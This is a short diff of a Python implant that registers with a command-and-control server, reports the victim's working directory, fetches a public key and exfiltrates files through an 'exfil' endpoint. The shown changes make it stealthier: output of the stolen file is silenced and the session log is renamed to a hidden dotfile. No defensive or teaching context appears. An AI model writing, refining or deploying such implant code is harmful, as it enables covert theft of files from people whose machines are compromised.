@@ -19,11 +19,11 @@ def ExfilFile(file, c2, IPAddress):
     filename = file.rsplit('/', 1)[-1]
     urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={filename}')
 
-    f = open(f'{file}', 'rb')
+    f = open(f'{file}', 'r')
     message = f.read()
     f.close()
 
-    print(message)
+    #print(message)
 
     with open(f"{implantDir}/public_key.pem", "rb") as key_file:
         public_key = serialization.load_pem_public_key(
@@ -118,7 +118,7 @@ else:
     dir = urllib.parse.quote_plus(os.getcwd())
     sid = urllib.request.urlopen(f'{c2}/?cwd={dir}').read().decode("utf-8")
     publicKey = urllib.request.urlopen(f'{c2}/publicKey').read().decode("utf-8")
-    f = open("sid.log", "w")
+    f = open(".sid.log", "w")
     f.write(sid)
     f.close()
 
